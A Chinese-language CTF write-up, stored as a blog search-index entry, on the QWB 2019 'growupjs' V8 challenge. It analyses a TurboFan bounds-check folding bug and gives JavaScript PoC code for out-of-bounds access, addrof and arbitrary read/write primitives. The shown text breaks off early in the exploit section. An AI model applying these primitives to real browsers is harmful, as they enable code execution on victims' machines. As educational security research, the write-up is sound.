<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[QWB CTF 2019 growupjs解题思路]]></title>
    <url>%2F2019%2F07%2F27%2FQWB%2F</url>
    <content type="text"><![CDATA[编译了一个d8程序用于验证和利用漏洞，相关附件下载 CheckBound优化流程首先在原有的simplified-lowering阶段，CheckBound节点并不被消除，而是设置为kAbortOnOutOfBounds模式，并替换为CheckedUint32Bounds。 123456789101112131415161718192021222324252627void VisitCheckBounds(Node* node, SimplifiedLowering* lowering) &#123; CheckParameters const&amp; p = CheckParametersOf(node-&gt;op()); Type const index_type = TypeOf(node-&gt;InputAt(0)); Type const length_type = TypeOf(node-&gt;InputAt(1)); if (length_type.Is(Type::Unsigned31())) &#123; if (index_type.Is(Type::Integral32OrMinusZero())) &#123; // Map -0 to 0, and the values in the [-2^31,-1] range to the // [2^31,2^32-1] range, which will be considered out-of-bounds // as well, because the &#123;length_type&#125; is limited to Unsigned31. VisitBinop(node, UseInfo::TruncatingWord32(), MachineRepresentation::kWord32); if (lower()) &#123; CheckBoundsParameters::Mode mode = CheckBoundsParameters::kDeoptOnOutOfBounds; if (lowering-&gt;poisoning_level_ == PoisoningMitigationLevel::kDontPoison &amp;&amp; (index_type.IsNone() || length_type.IsNone() || (index_type.Min() &gt;= 0.0 &amp;&amp; index_type.Max() &lt; length_type.Min()))) &#123; // The bounds check is redundant if we already know that // the index is within the bounds of [0.0, length[. mode = CheckBoundsParameters::kAbortOnOutOfBounds; &#125; NodeProperties::ChangeOp( node, simplified()-&gt;CheckedUint32Bounds(p.feedback(), mode)); &#125; &#125; 而在此之前，该位置如下，可见原先利用节点消除的漏洞利用方法不能使用了。 1234567891011121314if (lower()) &#123; if (lowering-&gt;poisoning_level_ == PoisoningMitigationLevel::kDontPoison &amp;&amp; (index_type.IsNone() || length_type.IsNone() || (index_type.Min() &gt;= 0.0 &amp;&amp; index_type.Max() &lt; length_type.Min()))) &#123; // The bounds check is redundant if we already know that // the index is within the bounds of [0.0, length[. DeferReplacement(node, node-&gt;InputAt(0)); &#125; else &#123; NodeProperties::ChangeOp( node, simplified()-&gt;CheckedUint32Bounds(p.feedback())); &#125;&#125; 在Effect linearization阶段，CheckedUint32Bounds节点会被优化成Uint32LessThan，并绑定上其True和False分支。 123456789101112131415161718192021222324252627282930Node* EffectControlLinearizer::LowerCheckedUint32Bounds(Node* node, Node* frame_state) &#123; Node* index = node-&gt;InputAt(0); Node* limit = node-&gt;InputAt(1); const CheckBoundsParameters&amp; params = CheckBoundsParametersOf(node-&gt;op()); Node* check = __ Uint32LessThan(index, limit); switch (params.mode()) &#123; case CheckBoundsParameters::kDeoptOnOutOfBounds: __ DeoptimizeIfNot(DeoptimizeReason::kOutOfBounds, params.check_parameters().feedback(), check, frame_state, IsSafetyCheck::kCriticalSafetyCheck); break; case CheckBoundsParameters::kAbortOnOutOfBounds: &#123; auto if_abort = __ MakeDeferredLabel(); auto done = __ MakeLabel(); __ Branch(check, &amp;done, &amp;if_abort); __ Bind(&amp;if_abort); __ Unreachable(); __ Goto(&amp;done); __ Bind(&amp;done); break; &#125; &#125; return index;&#125; 而在lateoptimize阶段，将其优化为左值&lt;右值这个表达式，即一个永真或者永假条件。 1234567891011121314151617181920212223242526272829// Perform constant folding and strength reduction on machine operators.Reduction MachineOperatorReducer::Reduce(Node* node) &#123; switch (node-&gt;opcode()) &#123;// [...] case IrOpcode::kUint32LessThan: &#123; Uint32BinopMatcher m(node); if (m.left().Is(kMaxUInt32)) return ReplaceBool(false); // M &lt; x =&gt; false if (m.right().Is(0)) return ReplaceBool(false); // x &lt; 0 =&gt; false if (m.IsFoldable()) &#123; // K &lt; K =&gt; K return ReplaceBool(m.left().Value() &lt; m.right().Value()); &#125; if (m.LeftEqualsRight()) return ReplaceBool(false); // x &lt; x =&gt; false if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123; Int32BinopMatcher mleft(m.left().node()); if (mleft.right().HasValue()) &#123; // (x &gt;&gt; K) &lt; C =&gt; x &lt; (C &lt;&lt; K) // when C &lt; (M &gt;&gt; K) const uint32_t c = m.right().Value(); const uint32_t k = mleft.right().Value() &amp; 0x1F; if (c &lt; static_cast&lt;uint32_t&gt;(kMaxInt &gt;&gt; k)) &#123; node-&gt;ReplaceInput(0, mleft.left().node()); node-&gt;ReplaceInput(1, Uint32Constant(c &lt;&lt; k)); return Changed(node); &#125; // TODO(turbofan): else the comparison is always true. &#125; &#125; break; &#125; 此后，另一个分支就变成了一个不可达的分支，最终在brancheliminate中被剪掉，达到和早期未patch版本同样的目的，但要求多了很多。 题目分析而从题目来看，题目只patch了两个字符，就是在上面 1return ReplaceBool(m.left().Value() &lt; m.right().Value()); 改为了 1return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1); 这样的话，就算达到访问一个element的下一个节点，这个checkBound也会被优化掉，从而有个off-by-one，如果能达到这一点，就和*ctf 2019的oob这题一模一样了，但那题的实现是增加了一个builtin函数，不需要利用优化，而此题需要在优化的前提下才能用，而且必须使CheckBound达到上述代码的位置。 测试样例分析测试代码： 1234567var opt_me2 = () =&gt; &#123; let arr = [1,2,3,4]; index = 4; return arr[index];&#125;;for (var i = 0; i &lt; 0x10000; ++i) opt_me2(); 可以发现使用上述测试样例并不能触发OOB，其原因也十分有趣，同样来源于优化过程。 首先通过--trace-turbo对优化过程的IR进行记录，发现在LoopPeeling阶段，44节点是一个值比较结点，而47结点是从element中读取数据，也就是实际执行arr[index]的这个节点。 但在下一阶段loadelimination中，比较44和47两个节点都消失了，最终结果将返回2结点（undefined）。 可以查看一下loadelimination都做了什么，从源码中可以看到主要以AddReducer方法添加了10个reducer 12345678910111213141516171819202122232425262728293031323334void Run(PipelineData* data, Zone* temp_zone) &#123; GraphReducer graph_reducer(temp_zone, data-&gt;graph(), &amp;data-&gt;info()-&gt;tick_counter(), data-&gt;jsgraph()-&gt;Dead()); BranchElimination branch_condition_elimination(&amp;graph_reducer, data-&gt;jsgraph(), temp_zone); DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(), data-&gt;common(), temp_zone); RedundancyElimination redundancy_elimination(&amp;graph_reducer, temp_zone); LoadElimination load_elimination(&amp;graph_reducer, data-&gt;jsgraph(), temp_zone); CheckpointElimination checkpoint_elimination(&amp;graph_reducer); ValueNumberingReducer value_numbering(temp_zone, data-&gt;graph()-&gt;zone()); CommonOperatorReducer common_reducer(&amp;graph_reducer, data-&gt;graph(), data-&gt;broker(), data-&gt;common(), data-&gt;machine(), temp_zone); TypedOptimization typed_optimization(&amp;graph_reducer, data-&gt;dependencies(), data-&gt;jsgraph(), data-&gt;broker()); ConstantFoldingReducer constant_folding_reducer( &amp;graph_reducer, data-&gt;jsgraph(), data-&gt;broker()); TypeNarrowingReducer type_narrowing_reducer(&amp;graph_reducer, data-&gt;jsgraph(), data-&gt;broker()); AddReducer(data, &amp;graph_reducer, &amp;branch_condition_elimination); AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination); AddReducer(data, &amp;graph_reducer, &amp;redundancy_elimination); AddReducer(data, &amp;graph_reducer, &amp;load_elimination); AddReducer(data, &amp;graph_reducer, &amp;type_narrowing_reducer); AddReducer(data, &amp;graph_reducer, &amp;constant_folding_reducer); AddReducer(data, &amp;graph_reducer, &amp;typed_optimization); AddReducer(data, &amp;graph_reducer, &amp;checkpoint_elimination); AddReducer(data, &amp;graph_reducer, &amp;common_reducer); AddReducer(data, &amp;graph_reducer, &amp;value_numbering); graph_reducer.ReduceGraph(); &#125; 而在graph_reducer.ReduceGraph中将分别对每个节点调用上述添加的10个*::Reduce()方法。 1234567891011121314151617181920212223242526272829303132333435363738Reduction GraphReducer::Reduce(Node* const node) &#123; auto skip = reducers_.end(); for (auto i = reducers_.begin(); i != reducers_.end();) &#123; if (i != skip) &#123; tick_counter_-&gt;DoTick(); Reduction reduction = (*i)-&gt;Reduce(node); if (!reduction.Changed()) &#123; // No change from this reducer. &#125; else if (reduction.replacement() == node) &#123; // &#123;replacement&#125; == &#123;node&#125; represents an in-place reduction. Rerun // all the other reducers for this node, as now there may be more // opportunities for reduction. if (FLAG_trace_turbo_reduction) &#123; StdoutStream&#123;&#125; &lt;&lt; "- In-place update of " &lt;&lt; *node &lt;&lt; " by reducer " &lt;&lt; (*i)-&gt;reducer_name() &lt;&lt; std::endl; &#125; skip = i; i = reducers_.begin(); continue; &#125; else &#123; // &#123;node&#125; was replaced by another node. if (FLAG_trace_turbo_reduction) &#123; StdoutStream&#123;&#125; &lt;&lt; "- Replacement of " &lt;&lt; *node &lt;&lt; " with " &lt;&lt; *(reduction.replacement()) &lt;&lt; " by reducer " &lt;&lt; (*i)-&gt;reducer_name() &lt;&lt; std::endl; &#125; return reduction; &#125; &#125; ++i; &#125; if (skip == reducers_.end()) &#123; // No change from any reducer. return Reducer::NoChange(); &#125; // At least one reducer did some in-place reduction. return Reducer::Changed(node);&#125; 使用trace-turbo-reduction对节点的修改和替换细节进行分析，可以发现在如下部分，首先是NumberLessThan(43, 16)内容被TypeNarrowingReducer更新，然后被ConstantFoldingReducer替换成HeapConstant固定值false，最终导致45节点True的分支变成不可达的节点，最终被DeadCodeElimination清理掉，造成没有触发OOB 12345- In-place update of 44: NumberLessThan(43, 16) by reducer TypeNarrowingReducer- Replacement of 44: NumberLessThan(43, 16) with 55: HeapConstant[0x210c2b740709 &lt;false&gt;] by reducer ConstantFoldingReducer- In-place update of 45: Branch[True|CriticalSafetyCheck](55, 12) by reducer BranchElimination- Replacement of 45: Branch[True|CriticalSafetyCheck](55, 12) with 70: Dead by reducer CommonOperatorReducer- Replacement of 47: LoadElement[tagged base, 16, Signed32, kRepTaggedSigned|kTypeInt32, FullWriteBarrier](59, 43, 43, 70) with 70: Dead by reducer DeadCodeElimination 首先跟踪TypeNarrowingReducer，可以看到当opcode是kNumberLessThan时，如果左节点的最小值大于右节点的最大值时，类型会被op_typer_.singleton_false();，是一个HeapConstant 123456789101112131415161718192021222324252627282930Reduction TypeNarrowingReducer::Reduce(Node* node) &#123; DisallowHeapAccess no_heap_access; Type new_type = Type::Any(); switch (node-&gt;opcode()) &#123; case IrOpcode::kNumberLessThan: &#123; // TODO(turbofan) Reuse the logic from typer.cc (by integrating relational // comparisons with the operation typer). Type left_type = NodeProperties::GetType(node-&gt;InputAt(0)); Type right_type = NodeProperties::GetType(node-&gt;InputAt(1)); if (left_type.Is(Type::PlainNumber()) &amp;&amp; right_type.Is(Type::PlainNumber())) &#123; if (left_type.Max() &lt; right_type.Min()) &#123; new_type = op_typer_.singleton_true(); &#125; else if (left_type.Min() &gt;= right_type.Max()) &#123; new_type = op_typer_.singleton_false(); &#125; &#125; break; &#125; //[...] Type original_type = NodeProperties::GetType(node); Type restricted = Type::Intersect(new_type, original_type, zone()); if (!original_type.Is(restricted)) &#123; NodeProperties::SetType(node, restricted); return Changed(node); &#125; return NoChange();&#125; 从日志中可以发现其左节点是43，从IR可以发现其范围是[4,4]，右节点是16 ，是一个常量值[4] 1- Replacement of 41: LoadField[tagged base, 24, Range(0, 134217726), kRepTaggedSigned|kTypeInt32, NoWriteBarrier, mutable](68, 17, 12) with 16: NumberConstant[4] by reducer LoadElimination 因此，在ConstantFoldingReducer::Reduce中，44节点将被生成的一个HeapConstant节点替代。 1234567891011121314151617181920212223242526272829303132Reduction ConstantFoldingReducer::Reduce(Node* node) &#123; DisallowHeapAccess no_heap_access; // Check if the output type is a singleton. In that case we already know the // result value and can simply replace the node if it's eliminable. if (!NodeProperties::IsConstant(node) &amp;&amp; NodeProperties::IsTyped(node) &amp;&amp; node-&gt;op()-&gt;HasProperty(Operator::kEliminatable)) &#123; // TODO(v8:5303): We must not eliminate FinishRegion here. This special // case can be removed once we have separate operators for value and // effect regions. if (node-&gt;opcode() == IrOpcode::kFinishRegion) return NoChange(); // We can only constant-fold nodes here, that are known to not cause any // side-effect, may it be a JavaScript observable side-effect or a possible // eager deoptimization exit (i.e. &#123;node&#125; has an operator that doesn't have // the Operator::kNoDeopt property). Type upper = NodeProperties::GetType(node); if (!upper.IsNone()) &#123; Node* replacement = nullptr; if (upper.IsHeapConstant()) &#123; replacement = jsgraph()-&gt;Constant(upper.AsHeapConstant()-&gt;Ref()); //[...] if (replacement) &#123; // Make sure the node has a type. if (!NodeProperties::IsTyped(replacement)) &#123; NodeProperties::SetType(replacement, upper); &#125; ReplaceWithValue(node, replacement); return Changed(replacement); &#125; &#125; &#125; return NoChange();&#125; 因此，想要触发OOB必须规避掉以上路径。可以从43节点和16节点两方面考虑。首先说16节点，其来自于41节点的优化 12- In-place update of 41: LoadField[tagged base, 24, Range(0, 134217726), kRepTaggedSigned|kTypeInt32, NoWriteBarrier, mutable](68, 17, 12) by reducer RedundancyElimination- Replacement of 41: LoadField[tagged base, 24, Range(0, 134217726), kRepTaggedSigned|kTypeInt32, NoWriteBarrier, mutable](68, 17, 12) with 16: NumberConstant[4] by reducer LoadElimination 当op搜索的参数field_index不是0时，到相应的object中找到相关偏移的节点代替掉这个LoadField节点，可见这个就是直接取出了要访问element的长度，似乎无法改变。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Reduction LoadElimination::ReduceLoadField(Node* node, FieldAccess const&amp; access) &#123; Node* object = NodeProperties::GetValueInput(node, 0); Node* effect = NodeProperties::GetEffectInput(node); Node* control = NodeProperties::GetControlInput(node); AbstractState const* state = node_states_.Get(effect); if (state == nullptr) return NoChange(); if (access.offset == HeapObject::kMapOffset &amp;&amp;//[...] &#125; else &#123; int field_index = FieldIndexOf(access); if (field_index &gt;= 0) &#123; PropertyConstness constness = access.constness; MachineRepresentation representation = access.machine_type.representation(); FieldInfo const* lookup_result = state-&gt;LookupField(object, field_index, constness); if (!lookup_result &amp;&amp; constness == PropertyConstness::kConst) &#123; lookup_result = state-&gt;LookupField(object, field_index, PropertyConstness::kMutable); &#125; if (lookup_result) &#123; // Make sure we don't reuse values that were recorded with a different // representation or resurrect dead &#123;replacement&#125; nodes. Node* replacement = lookup_result-&gt;value; if (IsCompatible(representation, lookup_result-&gt;representation) &amp;&amp; !replacement-&gt;IsDead()) &#123; // Introduce a TypeGuard if the type of the &#123;replacement&#125; node is not // a subtype of the original &#123;node&#125;'s type. if (!NodeProperties::GetType(replacement) .Is(NodeProperties::GetType(node))) &#123; Type replacement_type = Type::Intersect( NodeProperties::GetType(node), NodeProperties::GetType(replacement), graph()-&gt;zone()); replacement = effect = graph()-&gt;NewNode(common()-&gt;TypeGuard(replacement_type), replacement, effect, control); NodeProperties::SetType(replacement, replacement_type); &#125; ReplaceWithValue(node, replacement, effect); return Replace(replacement); &#125; &#125; FieldInfo info(node, access.name, representation); state = state-&gt;AddField(object, field_index, info, constness, zone()); &#125; &#125; Handle&lt;Map&gt; field_map; if (access.map.ToHandle(&amp;field_map)) &#123; state = state-&gt;SetMaps(node, ZoneHandleSet&lt;Map&gt;(field_map), zone()); &#125; return UpdateState(node, state);&#125; 而另一节点43 typer的路径如下： 123456789101112131415161718 Reduction Reduce(Node* node) override &#123; if (node-&gt;op()-&gt;ValueOutputCount() == 0) return NoChange(); switch (node-&gt;opcode()) &#123;#define DECLARE_CASE(x) \ case IrOpcode::k##x: \ return UpdateType(node, TypeBinaryOp(node, x##Typer)); JS_SIMPLE_BINOP_LIST(DECLARE_CASE)#undef DECLARE_CASE#define DECLARE_CASE(x) \ case IrOpcode::k##x: \ return UpdateType(node, Type##x(node)); DECLARE_CASE(Start) DECLARE_CASE(IfException) // VALUE_OP_LIST without JS_SIMPLE_BINOP_LIST: COMMON_OP_LIST(DECLARE_CASE) SIMPLIFIED_COMPARE_BINOP_LIST(DECLARE_CASE) SIMPLIFIED_OTHER_OP_LIST(DECLARE_CASE) // [here] SIMPLIFIED_OTHER_OP_LIST定义如下 1234#define SIMPLIFIED_OTHER_OP_LIST(V) \// [...] V(CheckBounds) \ V(CheckIf) \ 因此这个分支就变成了 12case IrOpcode::kCheckBounds: \ return UpdateType(node, TypeCheckBounds(node)); TypeCheckBounds定义如下，取第一个和第二个输入节点的类型，调用CheckBounds 1234Type Typer::Visitor::TypeCheckBounds(Node* node) &#123; return typer_-&gt;operation_typer_.CheckBounds(Operand(node, 0), Operand(node, 1));&#125; CheckBounds定义如下，显然index是一个实际的范围，而length负责控制其最大边界，而最终取index与mask的交集。 123456789Type OperationTyper::CheckBounds(Type index, Type length) &#123; DCHECK(length.Is(cache_-&gt;kPositiveSafeInteger)); if (length.Is(cache_-&gt;kSingletonZero)) return Type::None(); Type mask = Type::Range(0.0, length.Max() - 1, zone()); if (index.Maybe(Type::MinusZero())) &#123; index = Type::Union(index, cache_-&gt;kSingletonZero, zone()); &#125; return Type::Intersect(index, mask, zone());&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Type Type::Intersect(Type type1, Type type2, Zone* zone) &#123; // Fast case: bit sets. if (type1.IsBitset() &amp;&amp; type2.IsBitset()) &#123; return NewBitset(type1.AsBitset() &amp; type2.AsBitset()); &#125; // Fast case: top or bottom types. if (type1.IsNone() || type2.IsAny()) return type1; // Shortcut. if (type2.IsNone() || type1.IsAny()) return type2; // Shortcut. // Semi-fast case. if (type1.Is(type2)) return type1; if (type2.Is(type1)) return type2; // Slow case: create union. // Semantic subtyping check - this is needed for consistency with the // semi-fast case above. if (type1.Is(type2)) &#123; type2 = Any(); &#125; else if (type2.Is(type1)) &#123; type1 = Any(); &#125; bitset bits = type1.BitsetGlb() &amp; type2.BitsetGlb(); int size1 = type1.IsUnion() ? type1.AsUnion()-&gt;Length() : 1; int size2 = type2.IsUnion() ? type2.AsUnion()-&gt;Length() : 1; int size; if (base::bits::SignedAddOverflow32(size1, size2, &amp;size)) return Any(); if (base::bits::SignedAddOverflow32(size, 2, &amp;size)) return Any(); UnionType* result = UnionType::New(size, zone); size = 0; // Deal with bitsets. result-&gt;Set(size++, NewBitset(bits)); RangeType::Limits lims = RangeType::Limits::Empty(); size = IntersectAux(type1, type2, result, size, &amp;lims, zone); // If the range is not empty, then insert it into the union and // remove the number bits from the bitset. if (!lims.IsEmpty()) &#123; size = UpdateRange(Type::Range(lims, zone), result, size, zone); // Remove the number bits. bitset number_bits = BitsetType::NumberBits(bits); bits &amp;= ~number_bits; result-&gt;Set(0, NewBitset(bits)); &#125; return NormalizeUnion(result, size, zone);&#125; 对于测试demo，其0、1两个节点的范围如下： 显然就是取[4,4]和[0,2147483646]的交集，因此CheckBounds的typer结果是[4,4]。最终导致满足uintlessthan的优化条件left_type.Min() &gt;= right_type.Max()，被优化成永假。 poc构造综上，分析了测试样例不能触发OOB的原因，首先要想办法绕过loadelimination阶段对loadelement节点的消除。 可以发现一个显然的途径是在CheckBounds的typer阶段做文章，如果让CheckBounds节点的范围并非单一值而是一个范围，保证最小值小于要访问element的范围，就不会满足消除的条件(left_type.Min() &gt;= right_type.Max())，而核心问题是对第一个输入的节点范围的扩展，因为CheckBounds的范围基本由此确定。 长亭发表的一篇writeup中提到了两种解决方案，第一种是对index增加一个and操作idx &amp;= 0xfff;，这种方法会在原来NumberConstant[4]下面增加一个SpeculativeNumberBitwiseAnd节点。 而这个节点的typer实现如下： 123456789101112131415161718192021222324252627282930Type OperationTyper::NumberBitwiseAnd(Type lhs, Type rhs) &#123; DCHECK(lhs.Is(Type::Number())); DCHECK(rhs.Is(Type::Number())); lhs = NumberToInt32(lhs); rhs = NumberToInt32(rhs); if (lhs.IsNone() || rhs.IsNone()) return Type::None(); double lmin = lhs.Min(); double rmin = rhs.Min(); double lmax = lhs.Max(); double rmax = rhs.Max(); double min = kMinInt; // And-ing any two values results in a value no larger than their maximum. // Even no larger than their minimum if both values are non-negative. double max = lmin &gt;= 0 &amp;&amp; rmin &gt;= 0 ? std::min(lmax, rmax) : std::max(lmax, rmax); // And-ing with a non-negative value x causes the result to be between // zero and x. if (lmin &gt;= 0) &#123; min = 0; max = std::min(max, lmax); &#125; if (rmin &gt;= 0) &#123; min = 0; max = std::min(max, rmax); &#125; return Type::Range(min, max, zone());&#125; 其中lmin、lmax为255，rmin、rmax为4，因此最终该节点的范围(0,4)，传递至CheckBounds节点并不满足这消除条件，可以触发漏洞。 第二种，由于逃逸分析阶段在LoadElimination后一阶段，因此在typer时，无法直接分析出从array中取出的index具体值，只能将其分析为Signed32，最终CheckBounds的范围为(0,2147483646) 此外，还可以利用Phi节点来达到同样的目的，当某个值存在分支时，Turbofan会将增加一个phi节点，并将这两个值都加入节点的范围去传递，那么poc同样可以这样构造 12345678910var opt_me = (x) =&gt; &#123; let arr = [1,2,3,4.1]; let index = 0; if(x = 'p4nda') index = 4; return arr[index];&#125;;for (var i = 0; i &lt; 0x10000; ++i) opt_me('test');console.log(opt_me('p4nda')); 则构造的IR图如下 执行结果如下： 123# p4nda @ ubuntu in ~/chromium/v8/v8/out.gn/x64.debug/log on git:749f0727a2 x [10:39:33] C:130$ ../d8 ./test.js -1.1885946300594787e+148 addrof原语构造现在在element上存在一个off-by-one。对于一个JSArray，其数据结构本身与element内存分布存在两种布局，一种是elememt在低地址，一般用var a = [1.1,1.2,1.3]这样的方式构建；另一种是element在高地址，一般用var a = Array(4)这样的方式构建。由于二者内存位置紧邻，因此，可以通过off-by-one泄露或者修改一个对象的map地址，从而造成type confuse。 一个简单的想法就是将一个存放了obj的JSArray的map改为全部存放double类型的JSArray map。 首先泄露比较简单，利用之前的poc可以将arr的map，并将arr加入一个全局的Array防止map被释放。 12345678910111213141516171819function get_map_opt(x)&#123; let arr = [1.1,1.2,1.3,1.4]; let arr_ele = [arr,arr,arr,arr]; let index = 0; if(x = 'p4nda')&#123;index = 4;&#125; return [arr[index],arr,arr_ele];&#125;function get_map()&#123; var tmp ; for(var i = 0; i&lt; 10000;i++)&#123; tmp = get_map_opt('test'); &#125; double_map = tmp[0]; element_map =Add(Int64.fromDouble(double_map), 0xa0).asDouble(); global_var.push(tmp[1]); global_var.push(tmp[2]);&#125;get_map(); 在拿到了一个PACKED_DOUBLE_ELEMENTS类型的map时，就可以对一个PACKED_ELEMENTS类型的JSArray造类型混淆了。这里有一个坑点，就是不能对一个PACKED_ELEMENTS类型的map位置直接写一个double，因为element一共有三种类型，并且是不可逆的改变，向PACKED_ELEMENTS类型的element写double会将double转换为一个HeapNumber，也是一个HeapObject，而非double值本身。 例如： 123456789101112131415161718192021222324252627282930313233343536# p4nda @ ubuntu in ~/chromium/v8/v8/out.gn/x64.debug on git:749f0727a2 x [10:26:24] $ cat ./log/test.jslet a = [1.1,1.2];let b = [1,2];let c = [a,b];%DebugPrint(c);c[0] = 1.1;%DebugPrint(c);# p4nda @ ubuntu in ~/chromium/v8/v8/out.gn/x64.debug on git:749f0727a2 x [10:26:37] $ ./d8 --allow-natives-syntax ./log/test.jsDebugPrint: 0x39d386b0b441: [JSArray] - map: 0x2bd1746c3069 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties] - prototype: 0x2e535e811859 &lt;JSArray[0]&gt; - elements: 0x39d386b0b421 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS] - length: 2 - properties: 0x1c1fd9680c21 &lt;FixedArray[0]&gt; &#123; #length: 0x2c68462c01a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x39d386b0b421 &lt;FixedArray[2]&gt; &#123; 0: 0x39d386b0b3e1 &lt;JSArray[2]&gt; 1: 0x39d386b0b401 &lt;JSArray[2]&gt; &#125;DebugPrint: 0x39d386b0b441: [JSArray] - map: 0x2bd1746c3069 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties] - prototype: 0x2e535e811859 &lt;JSArray[0]&gt; - elements: 0x39d386b0b421 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS] - length: 2 - properties: 0x1c1fd9680c21 &lt;FixedArray[0]&gt; &#123; #length: 0x2c68462c01a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x39d386b0b421 &lt;FixedArray[2]&gt; &#123; 0: 0x2e535e81f8a9 &lt;HeapNumber 1.1&gt; 1: 0x39d386b0b401 &lt;JSArray[2]&gt; &#125; 因此需要做一下转换，对一个写满double_map的JSArray(PACKED_DOUBLE_ELEMEMTS类型)造类型混淆，使其混淆为PACKED_ELEMENT类型，这样再去其中的一个变量向PACKED_ELEMENT类型的JSArray写入，即可将其混淆为PACKED_DOUBLE_ELEMENT类型，从而读出其中object的地址。 12345678910111213141516171819202122232425262728293031function prepare_double_map_opt(x)&#123; let arr = [double_map,double_map,double_map,double_map]; let index = 0; if(x = 'p4nda')&#123;index = 4;&#125; arr[index] = element_map; return arr;&#125;function prepare_double_map()&#123; var tmp; for (var i = 0; i&lt; 10000;i++)&#123; tmp = prepare_double_map_opt(); &#125; return tmp[1];&#125; double_map_obj = prepare_double_map(); function addrof_opt(obj)&#123; var a = [obj, obj, obj, obj]; let index = 0; if(x = 'p4nda')&#123;index = 4&#125;; a[index] = double_map_obj; return a; &#125; function addrof(obj)&#123; for(var i = 0;i&lt;100000;i++)&#123; var a = addrof_opt(obj); &#125; return a[0];&#125; 任意地址读写构造JSArray数据可以存放于三个位置，以数字下标访问的存放于elements，以value:key访问的如果是初始化的时定义的，直接存于数据结构中，其余后续加入的存于properties，而对于键值对访问的数据，其键值查找方式存于map中，那么如果可以对一个JSArray的map进行修改，通过键值对访问的方式，对后续数据进行修改。 首先，获取一个含有properties很多的一个JSArray的map, 123456789101112131415161718function get_array_map_opt(x)&#123; let a = Array(2); a[0] = 1.1; a[1] = 1.2; let b = &#123;a0:1.1 , a1:1.1 , a2:1.1 , a3:1.1 , a4:1.1 , a5:1.1 , a6:1.1 , a7:1.1 , a8:1.1 , a9:1.1 , a10:1.1 , a11:1.1 , a12:1.1 , a13:1.1 , a14:1.1 , a15:1.1 , a16:1.1 , a17:1.1 , a18:1.1 , a19:1.1 , a20:1.1 , a21:1.1 , a22:1.1 , a23:1.1 , a24:1.1 , a25:1.1 , a26:1.1 , a27:1.1 , a28:1.1 , a29:1.1&#125;; let index = 0; if(x = 'p4nda')&#123;index = 2;&#125; return [a[index],b];&#125;function get_array_map()&#123; for(var i = 0; i&lt; 10000; i++)&#123; var tmp = get_array_map_opt(); &#125; array_map = tmp[0]; global_tmp.push(tmp[1]);&#125;get_array_map(); 通过布局使一个JSArrayBuffer恰好处于紧邻一个JSArray的高地址位置，这样将JSArray的map修改为以上map，就可以不断修改backing_store了，由于这个布局相对稳定，因此可以重复使用。 123456789101112131415161718function get_victim_obj_opt(x)&#123; let b = [11.1,1.1]; let index = 0; if (x = 'p4nda')&#123;index = 2;&#125; b[index] = array_map; console.log(b.length); return b;&#125;function get_victim_obj()&#123; for (var i = 0 ; i &lt; 10000; i++)&#123; var tmp = get_victim_obj_opt(); &#125; victim_arraybuffer = new ArrayBuffer(0x100); victim_jsarray = tmp;&#125; get_victim_obj(); 通过访问victim_jsarray.a5实际上读写的是victim_arraybuffer的backing_store成员，通过对victim_arraybuffer读写达到任意地址读写的目的。 最终，通过wasm对象，找到rwx-区域，执行shellcode。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366function gc()&#123; /*fill-up the 1MB semi-space page, force V8 to scavenge NewSpace.*/ for(var i=0;i&lt;((1024 * 1024)/0x10);i++) &#123; var a= new String(); &#125;&#125;function give_me_a_clean_newspace()&#123; /*force V8 to scavenge NewSpace twice to get a clean NewSpace.*/ gc() gc()&#125;let f64 = new Float64Array(1);let u32 = new Uint32Array(f64.buffer);function d2u(v) &#123; f64[0] = v; return u32;&#125;function u2d(lo, hi) &#123; u32[0] = lo; u32[1] = hi; return f64;&#125;function hex(b) &#123; return ('0' + b.toString(16)).substr(-2);&#125;// Return the hexadecimal representation of the given byte array.function hexlify(bytes) &#123; var res = []; for (var i = 0; i &lt; bytes.length; i++) res.push(hex(bytes[i])); return res.join('');&#125;// Return the binary data represented by the given hexdecimal string.function unhexlify(hexstr) &#123; if (hexstr.length % 2 == 1) throw new TypeError("Invalid hex string"); var bytes = new Uint8Array(hexstr.length / 2); for (var i = 0; i &lt; hexstr.length; i += 2) bytes[i/2] = parseInt(hexstr.substr(i, 2), 16); return bytes;&#125;function hexdump(data) &#123; if (typeof data.BYTES_PER_ELEMENT !== 'undefined') data = Array.from(data); var lines = []; for (var i = 0; i &lt; data.length; i += 16) &#123; var chunk = data.slice(i, i+16); var parts = chunk.map(hex); if (parts.length &gt; 8) parts.splice(8, 0, ' '); lines.push(parts.join(' ')); &#125; return lines.join('\n');&#125;// Simplified version of the similarly named python module.var Struct = (function() &#123; // Allocate these once to avoid unecessary heap allocations during pack/unpack operations. var buffer = new ArrayBuffer(8); var byteView = new Uint8Array(buffer); var uint32View = new Uint32Array(buffer); var float64View = new Float64Array(buffer); return &#123; pack: function(type, value) &#123; var view = type; // See below view[0] = value; return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT); &#125;, unpack: function(type, bytes) &#123; if (bytes.length !== type.BYTES_PER_ELEMENT) throw Error("Invalid bytearray"); var view = type; // See below byteView.set(bytes); return view[0]; &#125;, // Available types. int8: byteView, int32: uint32View, float64: float64View &#125;;&#125;)();//// Tiny module that provides big (64bit) 